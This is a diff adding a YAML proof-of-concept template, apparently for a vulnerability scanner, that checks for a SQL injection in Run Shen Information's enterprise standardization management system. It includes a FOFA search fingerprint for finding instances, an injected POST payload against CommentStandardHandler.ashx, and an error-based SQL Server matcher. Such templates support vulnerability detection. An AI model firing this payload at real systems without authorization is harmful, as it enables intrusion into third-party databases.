@@ -1,0 +1,25 @@
+id: poc-yaml-run-shen-information-enterprise-standardization-management-system-sql
+info:
+  name: 润申信息企业标准化管理系统 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业标准化管理系统
+  fofa: body="企业标准化管理系统"
+requests:
+- method: POST
+  path: /PDCA/ashx/CommentStandardHandler.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=detailInfo&fileid=1+and+(select+@@version)>0--
+  expression: 'status_code == 500
+
+    && contains(body,"Microsoft SQL Server")
+
+    && contains(body,"nvarchar")
+
+    && contains(body,"转换成数据类型 int 时失败")
+
+    '
+variables: {}
+transport: http
